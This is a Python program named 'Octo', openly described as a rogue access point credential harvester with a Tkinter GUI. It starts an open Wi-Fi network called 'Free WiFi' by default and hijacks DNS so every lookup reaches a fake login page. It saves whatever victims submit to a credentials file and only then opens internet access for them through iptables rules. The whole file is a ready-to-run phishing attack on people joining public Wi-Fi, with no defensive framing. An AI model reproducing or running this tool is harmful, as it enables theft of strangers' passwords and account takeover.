#!/usr/bin/env python3
"""Octo - rogue AP credential harvester with a Tk GUI."""

import os
import threading
import subprocess
import logging
import tkinter as tk
from tkinter import ttk, filedialog, messagebox
from datetime import datetime
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from urllib.parse import parse_qs

HOSTAPD_CONFIG = """interface={iface}
driver=nl80211
ssid={ssid}
hw_mode=g
channel=6
wmm_enabled=0
macaddr_acl=0
auth_algs=1
ignore_broadcast_ssid=0
wpa=0
"""


class IFace:
    def __init__(self, name):
        self.name = name

    def ensure_addr(self, addr, netmask):
        p = subprocess.Popen(
            f"ip addr add {addr}/{netmask} dev {self.name}".split(),
            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        p.wait()
        return p.returncode in [0, 2]

    @staticmethod
    def enable_forwarding():
        with open("/proc/sys/net/ipv4/ip_forward", "w") as f:
            f.write("1")
        with open("/proc/sys/net/ipv6/conf/all/forwarding", "w") as f:
            f.write("1")


class IpTables:
    FLUSH_COMMANDS = ["iptables -F", "iptables -t nat -F",
                      "iptables -t mangle -F", "iptables -X"]

    @staticmethod
    def exec(cmd):
        if isinstance(cmd, str):
            cmd = cmd.split()
        return subprocess.Popen(cmd, shell=False,
                                stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

    @staticmethod
    def setup(wifi_iface):
        p = IpTables.exec(f"iptables -A FORWARD -i {wifi_iface} -j DROP")
        p.wait()

    @staticmethod
    def flush():
        for cmd in IpTables.FLUSH_COMMANDS:
            IpTables.exec(cmd).wait()

    @staticmethod
    def allow(ip, wifi_iface, internet_iface):
        cmds = [
            f"iptables -t nat -A PREROUTING -i {wifi_iface} -p udp --dport 53 -j DNAT --to-destination 8.8.8.8:53",
            f"iptables -t nat -A PREROUTING -i {wifi_iface} -p tcp --dport 53 -j DNAT --to-destination 8.8.8.8:53",
            f"iptables -t nat -I POSTROUTING -s {ip} ! -o {wifi_iface} -j MASQUERADE",
            f"iptables -I FORWARD -i {wifi_iface} -s {ip} -j ACCEPT",
            f"iptables -I FORWARD -i {internet_iface} -d {ip} -j ACCEPT",
        ]
        for cmd in cmds:
            IpTables.exec(cmd).wait()


class OctoHttpHandler(BaseHTTPRequestHandler):
    TEMPLATE = None
    OUTFILE = None
    IFACES = (None, None)

    def _set_response(self):
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()

    def do_GET(self):
        self._set_response()
        self.wfile.write(bytes(OctoHttpHandler.TEMPLATE, "utf8"))

    def log_message(self, fmt, *args):
        logging.info("%s - %s", self.client_address[0], fmt % args)

    def do_POST(self):
        content_length = int(self.headers.get('Content-Length', 0))
        post_data = self.rfile.read(content_length)

        if post_data:
            try:
                parsed = parse_qs(post_data.decode('utf-8'))
                with open(OctoHttpHandler.OUTFILE, "a") as out:
                    out.write("[{}] {}\n".format(datetime.now(), str(parsed)))
                logging.info("Credentials captured: %s", parsed)

                wifi_iface, inet_iface = OctoHttpHandler.IFACES
                if wifi_iface and inet_iface:
                    IpTables.allow(self.client_address[0], wifi_iface, inet_iface)
                    self.send_response(302)
                    self.send_header('Location', 'https://www.google.com')
                    self.end_headers()
                    return
            except Exception as ex:
                logging.error(ex)

        self.send_error(404)


def get_installed_packages():
    try:
        from apt import Cache
    except ImportError:
        return ['dnsmasq', 'hostapd']
    return [pkg.name for pkg in Cache() if pkg.is_installed]


def check_requirements():
    return {'dnsmasq', 'hostapd'}.issubset(set(get_installed_packages()))


class OctoGUI:
    def __init__(self, root):
        self.root = root
        root.title("Rogue AP Harvester")
        root.resizable(False, False)

        self.dns_proc = None
        self.hostapd_proc = None
        self.httpd = None

        pad = dict(padx=8, pady=4)

        # --- form frame ---
        frm = ttk.Frame(root)
        frm.grid(row=0, column=0, sticky="ew", **pad)

        ttk.Label(frm, text="SSID:").grid(row=0, column=0, sticky="e", **pad)
        self.ssid_var = tk.StringVar(value="Free WiFi")
        ttk.Entry(frm, textvariable=self.ssid_var, width=30).grid(row=0, column=1, **pad)

        ttk.Label(frm, text="WiFi interface:").grid(row=1, column=0, sticky="e", **pad)
        self.iface_var = tk.StringVar(value="wlan0")
        ttk.Entry(frm, textvariable=self.iface_var, width=30).grid(row=1, column=1, **pad)

        ttk.Label(frm, text="Internet interface:").grid(row=2, column=0, sticky="e", **pad)
        self.inet_var = tk.StringVar(value="eth0")
        ttk.Entry(frm, textvariable=self.inet_var, width=30).grid(row=2, column=1, **pad)
        ttk.Label(frm, text="(leave empty for no internet sharing)").grid(row=2, column=2, sticky="w")

        ttk.Label(frm, text="HTML template:").grid(row=3, column=0, sticky="e", **pad)
        self.template_var = tk.StringVar()
        ttk.Entry(frm, textvariable=self.template_var, width=30).grid(row=3, column=1, **pad)
        ttk.Button(frm, text="Browse...", command=self.browse_template).grid(row=3, column=2, **pad)

        ttk.Label(frm, text="Output file:").grid(row=4, column=0, sticky="e", **pad)
        self.outfile_var = tk.StringVar(value="creds.txt")
        ttk.Entry(frm, textvariable=self.outfile_var, width=30).grid(row=4, column=1, **pad)

        # --- buttons ---
        btns = ttk.Frame(root)
        btns.grid(row=1, column=0, **pad)
        self.start_btn = ttk.Button(btns, text="Start AP", command=self.start)
        self.start_btn.grid(row=0, column=0, padx=4)
        self.stop_btn = ttk.Button(btns, text="Stop", command=self.stop, state="disabled")
        self.stop_btn.grid(row=0, column=1, padx=4)

        # --- log pane ---
        self.log_text = tk.Text(root, height=12, width=70, state="disabled",
                                bg="black", fg="lime")
        self.log_text.grid(row=2, column=0, **pad)

        self.log_queue = []
        self.root.after(200, self._poll_log)

        self.outfile_pos = 0
        self.root.after(1000, self._poll_creds)

    def browse_template(self):
        path = filedialog.askopenfilename(
            filetypes=[("HTML files", "*.html *.htm"), ("All files", "*")])
        if path:
            self.template_var.set(path)

    class TkLogHandler(logging.Handler):
        def __init__(self, queue):
            super().__init__()
            self.queue = queue
            self.setFormatter(logging.Formatter("%(asctime)s %(levelname)s %(message)s"))

        def emit(self, record):
            self.queue.append(self.format(record))

    def _poll_log(self):
        while self.log_queue:
            line = self.log_queue.pop(0)
            self.log_text.configure(state="normal")
            self.log_text.insert("end", line + "\n")
            self.log_text.see("end")
            self.log_text.configure(state="disabled")
        self.root.after(200, self._poll_log)

    def _poll_creds(self):
        outfile = self.outfile_var.get()
        try:
            if os.path.exists(outfile):
                with open(outfile, "r") as f:
                    f.seek(self.outfile_pos)
                    new = f.read()
                    self.outfile_pos = f.tell()
                if new:
                    self.log_text.configure(state="normal")
                    self.log_text.insert("end", "*** CAPTURED ***\n" + new)
                    self.log_text.see("end")
                    self.log_text.configure(state="disabled")
        except OSError:
            pass
        self.root.after(1000, self._poll_creds)

    def start(self):
        ssid = self.ssid_var.get().strip()
        iface = self.iface_var.get().strip()
        template = self.template_var.get().strip()
        outfile = self.outfile_var.get().strip()
        inet = self.inet_var.get().strip()

        if not ssid or not iface or not template or not outfile:
            messagebox.showerror("Error", "SSID, interface, template and output file are required.")
            return
        if not os.path.isfile(template):
            messagebox.showerror("Error", f"Template file not found: {template}")
            return
        if not check_requirements():
            messagebox.showerror("Error", "dnsmasq and hostapd must be installed.")
            return

        threading.Thread(target=self._start_worker,
                         args=(ssid, iface, template, outfile, inet), daemon=True).start()

    def _start_worker(self, ssid, iface, template, outfile, inet):
        try:
            iface_obj = IFace(iface)
            iface_obj.ensure_addr('192.168.66.1', '255.255.255.0')
            iface_obj.ensure_addr('192.168.66.2', '255.255.255.0')

            logging.info("Killing existing dnsmasq/hostapd...")
            subprocess.run(["killall", "dnsmasq", "hostapd"],
                           stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

            dnsmasq_cmd = [
                "dnsmasq", "--no-daemon", "--no-hosts", "--no-poll", "--no-resolv",
                f"--interface={iface}",
                "--dhcp-range=192.168.66.3,192.168.66.254,255.255.255.0,24h",
                "--dhcp-option=3,192.168.66.1",
                "--dhcp-option=6,192.168.66.1",
                "--address=/#/192.168.66.2",
            ]
            self.dns_proc = subprocess.Popen(
                dnsmasq_cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            logging.info("dnsmasq started (pid %d)", self.dns_proc.pid)

            self.hostapd_proc = subprocess.Popen(
                ["hostapd", "/dev/stdin"], stdin=subprocess.PIPE,
                stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            try:
                self.hostapd_proc.communicate(
                    input=str.encode(HOSTAPD_CONFIG.format(iface=iface, ssid=ssid)), timeout=1)
            except Exception:
                pass
            logging.info("hostapd started (pid %d), SSID='%s'", self.hostapd_proc.pid, ssid)

            OctoHttpHandler.TEMPLATE = open(template).read()
            OctoHttpHandler.OUTFILE = outfile

            if inet and os.path.exists(f"/sys/class/net/{inet}"):
                OctoHttpHandler.IFACES = (iface, inet)
                IpTables.flush()
                IpTables.setup(iface)
                IFace.enable_forwarding()
                logging.info("Internet sharing enabled via %s", inet)
            else:
                OctoHttpHandler.IFACES = (None, None)
                logging.info("No internet sharing (captive portal only mode)")

            self.httpd = ThreadingHTTPServer(('192.168.66.2', 80), OctoHttpHandler)
            logging.info("HTTP server listening on 192.168.66.2:80 — AP is up.")
            self.root.after(0, lambda: (self.start_btn.configure(state="disabled"),
                                        self.stop_btn.configure(state="normal")))
            self.httpd.serve_forever()
        except Exception as ex:
            logging.exception("Startup failed: %s", ex)
            self.root.after(0, lambda: messagebox.showerror("Error", str(ex)))
            self._cleanup()

    def stop(self):
        threading.Thread(target=self._cleanup, daemon=True).start()

    def _cleanup(self):
        logging.info("Stopping...")
        if self.httpd:
            self.httpd.shutdown()
            self.httpd.server_close()
            self.httpd = None
        for proc in (self.dns_proc, self.hostapd_proc):
            if proc and proc.poll() is None:
                proc.terminate()
                try:
                    proc.wait(timeout=3)
                except subprocess.TimeoutExpired:
                    proc.kill()
        self.dns_proc = self.hostapd_proc = None
        self.root.after(0, lambda: (self.start_btn.configure(state="normal"),
                                    self.stop_btn.configure(state="disabled")))
        logging.info("Stopped.")


def main():
    logging.basicConfig(level=logging.INFO)

    root = tk.Tk()
    gui = OctoGUI(root)
    handler = OctoGUI.TkLogHandler(gui.log_queue)
    logging.getLogger().addHandler(handler)

    root.protocol("WM_DELETE_WINDOW", lambda: (gui._cleanup(), root.destroy()))
    root.mainloop()


if __name__ == "__main__":
    main()
